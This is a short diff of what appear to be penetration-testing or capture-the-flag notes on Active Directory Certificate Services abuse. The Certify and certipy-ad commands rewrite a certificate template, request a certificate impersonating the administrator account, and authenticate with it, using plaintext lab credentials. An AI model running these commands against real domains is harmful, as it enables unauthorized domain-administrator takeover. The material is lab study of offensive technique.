@@ -19,7 +19,7 @@ Certify.exe find /vulnerable /ca:"CA-Server\CA-Name"
 ```powershell
 certipy-ad template -u 'CA_SVC@sequel.htb' -p 'sako2005!' -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -write-default-configuration -save-configuration /tmp/DunderMifflin_old.json
 
-certipy-ad req -u 'CA_SVC@sequel.htb' -p 'sako2005!' -ca sequel-DC01-CA -dc-ip 10.129.232.128 -target 10.129.232.128 -ns 10.129.232.128 -template DunderMifflinAuthentication -upn administrator@sequel.htb
+certipy-ad req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -target 'dc.sendai.vl' -ca 'sendai-DC-CA' -template SENDAICOMPUTER -upn 'administrator' -sid 'S-1-5-21-3085872742-570972823-736764132-500'
 
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.128
 ```
